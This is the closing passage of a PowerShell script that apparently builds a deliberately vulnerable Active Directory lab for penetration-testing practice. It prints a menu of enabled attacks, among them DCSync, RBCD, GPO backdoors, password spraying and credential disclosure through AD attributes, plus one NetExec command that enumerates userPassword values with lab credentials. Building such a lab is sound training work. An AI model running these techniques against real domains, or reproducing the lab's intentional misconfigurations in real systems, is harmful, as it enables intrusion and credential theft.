        Write-ColorOutput "  3. Resource-Based Constrained Delegation (RBCD)" "White"
        Write-ColorOutput "  4. DCSync Attack (using svc_replication account - realistic misconfiguration)" "White"
        Write-ColorOutput "  5. ACL Abuse (WriteDACL on Domain Admins)" "White"
        Write-ColorOutput "  6. GPO Abuse (modify GPOs to add backdoors)" "White"
        Write-ColorOutput "  7. Password Spraying (password not required accounts)" "White"
        Write-ColorOutput "  8. Information Disclosure - Passwords in AD descriptions (Get-ADUser -Filter * -Properties Description)" "White"
        Write-ColorOutput "  9. Information Disclosure - Sensitive data in AD attributes" "White"
        Write-ColorOutput "  10. LDAP Password Disclosure - userPassword attribute enumeration" "White"
        Write-ColorOutput "      Example: nxc ldap 192.168.72.129 -d breakme.local -u djones -p Qwerty1 -M get-userPassword" "Cyan"
        Write-ColorOutput ""
        Write-ColorOutput "The lab is fully configured for advanced penetration testing!" "Green"
    }
    
} catch {
    Write-ColorOutput "[!] Error occurred: $($_.Exception.Message)" "Red"
    Write-ColorOutput "[!] Stack trace: $($_.ScriptStackTrace)" "Red"
    exit 1
}


